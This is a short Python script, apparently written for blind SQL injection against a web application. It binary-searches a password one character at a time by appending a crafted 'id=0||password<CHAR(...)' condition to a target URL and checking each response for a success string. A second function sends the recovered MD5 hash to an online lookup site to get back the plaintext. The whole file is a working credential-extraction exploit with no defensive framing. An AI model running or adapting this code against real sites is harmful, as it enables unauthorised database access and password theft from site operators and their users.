#!/usr/bin/env python3
#
#  -*- coding: utf8 -*-
#  This program is free software: you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation, either version 3 of the License, or
#  (at your option) any later version.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.
#
#  You should have received a copy of the GNU General Public License
#  along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
#  Copyright 2012 Yannick Méheut <useless@utouch.fr>

import sys, requests

def blind_injection(target_url, authorized_characters, string_when_success, length):
	'''
	This function will be performing the injection. It will do a binary search
	on the authorized_characters.
	* target_url: the URL where the injection will be performed
	* authorized_characters: chars we'll test for the password
	* string_when_success: the string we'll look for for the binary search outcome
	* length: length of the password
	The function will return the found password.
	'''

	print('Retrieving password...', end=' ')
	sys.stdout.flush()
	password = ''
	ascii_password = ''

	# While we don't have the entire password
	while (len(password) < length):
		# Parameters for the binary search
		a, b = 0, len(authorized_characters) - 1
		# old_c is used, cause we can't performan usual
		# binary search (we can't test the equality)
		c, old_c = 0, 0

		# We perform a binary search to find the right character
		while (a < b):
			old_c = c
			c = int((a + b)/2)

			if (c == old_c):
				c += 1

			tested_character = authorized_characters[c]

			# The injection performed here is URL-based
			# To use another mean of injection (HTTP Headers, Cookies...)
			# change the crafting between the hashtags

			#### CHANGE HERE
			if '?' in target_url:
				separator = '&'
			else:
				separator = '?'
			url = target_url + separator + 'id=0||password<CHAR({0}{1})'
			url = url.format(ascii_password, ord(tested_character))
			#### END OF CHANGE

			r = requests.get(url)
			output = r.text

			# We seek which half of authorized_characters
			# we should search in
			if string_when_success in output:
				b = c - 1
			else:
				a = c

		# When we find a character, we display it on stdout
		new_character = authorized_characters[a]
		print(new_character, end='')
		sys.stdout.flush()
		# We add it to the password
		password += new_character
		ascii_password += str(ord(new_character)) + ','

	print('')

	return password

def reverse_hash(hash_to_reverse):
	'''
	This function is used to reverse a MD5 hash.
	It uses an online tool: http://md5.gromweb.com/query/
	It then parses the result page to find the plain password.
	'''

	url = 'http://md5.gromweb.com/query/{0}'.format(hash_to_reverse)
	r = requests.get(url)

	# We retrieve the result page
	plain_password = result = r.text

	return plain_password

